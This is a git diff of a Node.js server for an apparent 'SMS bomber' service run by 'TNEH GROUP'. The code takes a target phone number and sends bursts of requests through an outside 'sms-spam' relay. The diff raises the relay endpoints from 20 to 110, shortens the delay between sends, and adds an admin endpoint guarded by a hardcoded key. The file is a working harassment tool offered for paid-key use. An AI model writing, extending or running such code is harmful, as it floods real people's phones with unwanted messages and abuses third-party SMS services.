@@ -3,6 +3,7 @@ const axios = require('axios');
 const cors = require('cors');
 const helmet = require('helmet');
 const path = require('path');
+const fs = require('fs');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -15,7 +16,7 @@ app.use(cors());
 app.use(express.json());
 app.use(express.static(path.join(__dirname, '../public')));
 
-// Developer Info
+// Developer Info - TNEH GROUP
 const DEVELOPER_INFO = {
   developer: "TNEH GROUP",
   telegram: "@tneh_owner",
@@ -23,8 +24,48 @@ const DEVELOPER_INFO = {
   api_version: "1.0.0"
 };
 
-// API Keys storage (in-memory, will reset on restart)
-const validKeys = new Map();
+// File path for storing keys
+const KEYS_FILE = path.join(__dirname, 'keys.json');
+
+// Load keys from file
+function loadKeys() {
+  try {
+    if (fs.existsSync(KEYS_FILE)) {
+      const data = fs.readFileSync(KEYS_FILE, 'utf8');
+      const parsed = JSON.parse(data);
+      // Convert object back to Map
+      const keysMap = new Map();
+      Object.entries(parsed).forEach(([key, value]) => {
+        keysMap.set(key, new Date(value));
+      });
+      return keysMap;
+    }
+  } catch (error) {
+    console.error('Error loading keys:', error.message);
+  }
+  return new Map();
+}
+
+// Save keys to file
+function saveKeys(keysMap) {
+  try {
+    const obj = {};
+    for (const [key, value] of keysMap.entries()) {
+      obj[key] = value.toISOString();
+    }
+    fs.writeFileSync(KEYS_FILE, JSON.stringify(obj, null, 2));
+  } catch (error) {
+    console.error('Error saving keys:', error.message);
+  }
+}
+
+// API Keys storage (persistent)
+let validKeys = loadKeys();
+
+// Save keys periodically (every time a key is added)
+function persistKeys() {
+  saveKeys(validKeys);
+}
 
 // Generate API Key
 function generateApiKey() {
@@ -39,19 +80,64 @@ function isKeyValid(key) {
   return new Date() < expiryDate;
 }
 
-// SMS Spam API endpoints (first 20 for demo, full list available)
-const SMS_APIS = [
-  "/api1", "/api2", "/api3", "/api4", "/api5", "/api6", "/api7", "/api8", "/api9", "/api10",
-  "/api11", "/api12", "/api13", "/api14", "/api15", "/api16", "/api17", "/api18", "/api19", "/api20"
-];
+// Clean expired keys
+function cleanExpiredKeys() {
+  const now = new Date();
+  let changed = false;
+  for (const [key, expiryDate] of validKeys.entries()) {
+    if (now > expiryDate) {
+      validKeys.delete(key);
+      changed = true;
+    }
+  }
+  if (changed) {
+    persistKeys();
+  }
+}
 
-// Send SMS function
-async function sendSMS(apiEndpoint, number) {
+// Run cleanup every hour
+setInterval(cleanExpiredKeys, 60 * 60 * 1000);
+
+// Generate all SMS APIs from api1 to api110
+const SMS_APIS = [];
+for (let i = 1; i <= 110; i++) {
+  SMS_APIS.push({
+    api_endpoint: `/api${i}`,
+    api_example: `https://lmnx9-sms-spam-v11.onrender.com/api${i}?number=018XXXXXXXX`,
+    api_name: `LMNx9 API${i}`
+  });
+}
+
+// LMNx9 API Base URL
+const LMNX9_BASE_URL = 'https://lmnx9-sms-spam-v11.onrender.com';
+
+// Get all available APIs from LMNx9
+async function getLMNx9APIs() {
   try {
-    const response = await axios.get(`https://lmnx9-sms-spam-v11.onrender.com${apiEndpoint}?number=${number}`, {
-      timeout: 15000,
+    const response = await axios.get(LMNX9_BASE_URL, {
+      timeout: 10000,
       headers: {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+      }
+    });
+    return response.data;
+  } catch (error) {
+    console.error('Error fetching LMNx9 APIs:', error.message);
+    return {
+      all_apis: SMS_APIS,
+      total_apis: SMS_APIS.length
+    };
+  }
+}
+
+// Send SMS function using LMNx9 API
+async function sendSMS(apiEndpoint, number) {
+  try {
+    const response = await axios.get(`${LMNX9_BASE_URL}${apiEndpoint}?number=${number}`, {
+      timeout: 15000,
+      headers: {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Accept': 'application/json'
       }
     });
     return {
@@ -67,6 +153,34 @@ async function sendSMS(apiEndpoint, number) {
     };
   }
 }
+
+// Root endpoint
+app.get('/', async (req, res) => {
+  const apiData = await getLMNx9APIs();
+  const currentTime = new Date().toLocaleTimeString('en-US', {
+    hour: '2-digit',
+    minute: '2-digit',
+    second: '2-digit',
+    hour12: true
+  });
+  
+  res.json({
+    developer: DEVELOPER_INFO,
+    all_apis: apiData.all_apis || SMS_APIS,
+    total_apis: apiData.total_apis || SMS_APIS.length,
+    http_code: 200,
+    status: "success",
+    req_time: currentTime,
+    endpoints: {
+      generate_key: "/api/expiredate=30&createkey",
+      check_key: "/api/checkkey?key=YOUR_KEY",
+      spam_bomber: "/api/spam?key=YOUR_KEY&number=017XXXXXXXX&count=10",
+      single_send: "/api/send?key=YOUR_KEY&number=017XXXXXXXX&api=/api1",
+      all_apis: "/api/apis",
+      health: "/api/health"
+    }
+  });
+});
 
 // Main SMS Spam endpoint
 app.get('/api/spam', async (req, res) => {
@@ -101,16 +215,23 @@ app.get('/api/spam', async (req, res) => {
   
   let limit = parseInt(count);
   if (isNaN(limit) || limit < 1) limit = 10;
-  if (limit > 20) limit = 20;
+  if (limit > SMS_APIS.length) limit = SMS_APIS.length;
   
   const apisToUse = SMS_APIS.slice(0, limit);
   const results = [];
   
   for (const api of apisToUse) {
-    const result = await sendSMS(api, cleanNumber);
+    const result = await sendSMS(api.api_endpoint, cleanNumber);
     results.push(result);
-    await new Promise(resolve => setTimeout(resolve, 1000));
+    await new Promise(resolve => setTimeout(resolve, 500));
   }
+  
+  const currentTime = new Date().toLocaleTimeString('en-US', {
+    hour: '2-digit',
+    minute: '2-digit',
+    second: '2-digit',
+    hour12: true
+  });
   
   res.json({
     success: true,
@@ -119,6 +240,7 @@ app.get('/api/spam', async (req, res) => {
     total_requests_sent: results.length,
     successful_requests: results.filter(r => r.success).length,
     failed_requests: results.filter(r => !r.success).length,
+    req_time: currentTime,
     results: results
   });
 });
@@ -144,22 +266,31 @@ app.get('/api/send', async (req, res) => {
   }
   
   const result = await sendSMS(api, number);
+  const currentTime = new Date().toLocaleTimeString('en-US', {
+    hour: '2-digit',
+    minute: '2-digit',
+    second: '2-digit',
+    hour12: true
+  });
+  
   res.json({
     success: true,
     developer: DEVELOPER_INFO,
     target_number: number,
     api_used: api,
+    req_time: currentTime,
     result: result
   });
 });
 
-// Create API Key (30 days)
+// Generate API Key (30 days)
 app.get('/api/expiredate=30&createkey', (req, res) => {
   const apiKey = generateApiKey();
   const expiryDate = new Date();
   expiryDate.setDate(expiryDate.getDate() + 30);
   
   validKeys.set(apiKey, expiryDate);
+  persistKeys(); // Save to file immediately
   
   res.json({
     success: true,
@@ -167,7 +298,8 @@ app.get('/api/expiredate=30&createkey', (req, res) => {
     expiry_date: expiryDate.toISOString(),
     valid_days: 30,
     developer: DEVELOPER_INFO,
-    message: "API key generated successfully. Valid for 30 days."
+    message: "API key generated successfully. Valid for 30 days.",
+    note: "Save this key! It won't be shown again."
   });
 });
 
@@ -196,42 +328,128 @@ app.get('/api/checkkey', (req, res) => {
   });
 });
 
-// Get available APIs list
-app.get('/api/apis', (req, res) => {
-  const apis = SMS_APIS.map(api => ({
-    api_endpoint: api,
-    api_example: `https://tnehboomber.onrender.com/api/send?key=YOUR_KEY&number=017XXXXXXXX&api=${api}`,
-    api_name: `TNEH SMS API ${api.replace('/api', '')}`
-  }));
+// Get all available APIs
+app.get('/api/apis', async (req, res) => {
+  const currentTime = new Date().toLocaleTimeString('en-US', {
+    hour: '2-digit',
+    minute: '2-digit',
+    second: '2-digit',
+    hour12: true
+  });
+  
+  try {
+    const apiData = await getLMNx9APIs();
+    res.json({
+      developer: DEVELOPER_INFO,
+      all_apis: apiData.all_apis || SMS_APIS,
+      total_apis: apiData.total_apis || SMS_APIS.length,
+      http_code: 200,
+      status: "success",
+      req_time: currentTime
+    });
+  } catch (error) {
+    res.json({
+      developer: DEVELOPER_INFO,
+      all_apis: SMS_APIS,
+      total_apis: SMS_APIS.length,
+      http_code: 200,
+      status: "success",
+      req_time: currentTime
+    });
+  }
+});
+
+// Get all saved keys (Admin only - for debugging)
+app.get('/api/admin/keys', (req, res) => {
+  const { admin_key } = req.query;
+  // Simple admin check
+  if (admin_key !== 'TNEH_ADMIN_2024') {
+    return res.status(401).json({ error: 'Unauthorized' });
+  }
+  
+  const keys = [];
+  for (const [key, expiryDate] of validKeys.entries()) {
+    keys.push({
+      key: key,
+      expiry: expiryDate.toISOString(),
+      valid: new Date() < expiryDate
+    });
+  }
+  
+  res.json({
+    total_keys: keys.length,
+    keys: keys
+  });
+});
+
+// Get specific API
+app.get('/api/api:num', async (req, res) => {
+  const { key, number } = req.query;
+  const apiNum = req.params.num;
+  const apiEndpoint = `/api${apiNum}`;
+  
+  if (!key || !number) {
+    return res.status(400).json({
+      success: false,
+      error: 'Missing required parameters: key and number',
+      developer: DEVELOPER_INFO
+    });
+  }
+  
+  if (!isKeyValid(key)) {
+    return res.status(401).json({
+      success: false,
+      error: 'Invalid or expired API key',
+      developer: DEVELOPER_INFO
+    });
+  }
+  
+  const result = await sendSMS(apiEndpoint, number);
+  const currentTime = new Date().toLocaleTimeString('en-US', {
+    hour: '2-digit',
+    minute: '2-digit',
+    second: '2-digit',
+    hour12: true
+  });
   
   res.json({
     success: true,
-    total_apis: apis.length,
-    all_apis: apis,
-    developer: DEVELOPER_INFO
+    developer: DEVELOPER_INFO,
+    target_number: number,
+    api_used: apiEndpoint,
+    req_time: currentTime,
+    result: result
   });
 });
 
 // Health check
 app.get('/api/health', (req, res) => {
+  const currentTime = new Date().toLocaleTimeString('en-US', {
+    hour: '2-digit',
+    minute: '2-digit',
+    second: '2-digit',
+    hour12: true
+  });
+  
   res.json({
     status: 'active',
-    timestamp: new Date().toISOString(),
-    uptime: process.uptime(),
     developer: DEVELOPER_INFO,
-    endpoints: [
-      '/api/expiredate=30&createkey',
-      '/api/checkkey?key=YOUR_KEY',
-      '/api/spam?key=YOUR_KEY&number=017XXXXXXXX&count=10',
-      '/api/send?key=YOUR_KEY&number=017XXXXXXXX&api=/api1',
-      '/api/apis'
-    ]
+    timestamp: new Date().toISOString(),
+    req_time: currentTime,
+    uptime: process.uptime(),
+    total_apis: SMS_APIS.length,
+    total_active_keys: validKeys.size,
+    api_range: "API 1 to API 110",
+    endpoints: {
+      root: "/",
+      generate_key: "/api/expiredate=30&createkey",
+      check_key: "/api/checkkey?key=YOUR_KEY",
+      spam_bomber: "/api/spam?key=YOUR_KEY&number=017XXXXXXXX&count=110",
+      single_send: "/api/send?key=YOUR_KEY&number=017XXXXXXXX&api=/api1",
+      specific_api: "/api/api1?key=YOUR_KEY&number=017XXXXXXXX",
+      all_apis: "/api/apis"
+    }
   });
-});
-
-// Root endpoint
-app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, '../public/index.html'));
 });
 
 // 404 handler
@@ -257,5 +475,8 @@ app.use((err, req, res, next) => {
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`✅ TNEH BOOMER APP running on port ${PORT}`);
   console.log(`🌐 Website URL: https://tnehboomber.onrender.com`);
-  console.log(`📡 API URL: https://tnehboomber.onrender.com/api/health`);
+  console.log(`👨‍💻 Developer: ${DEVELOPER_INFO.developer}`);
+  console.log(`📱 Telegram: ${DEVELOPER_INFO.telegram}`);
+  console.log(`📡 Total SMS APIs: ${SMS_APIS.length} (API 1 to API 110)`);
+  console.log(`💾 Loaded ${validKeys.size} saved API keys from storage`);
 });
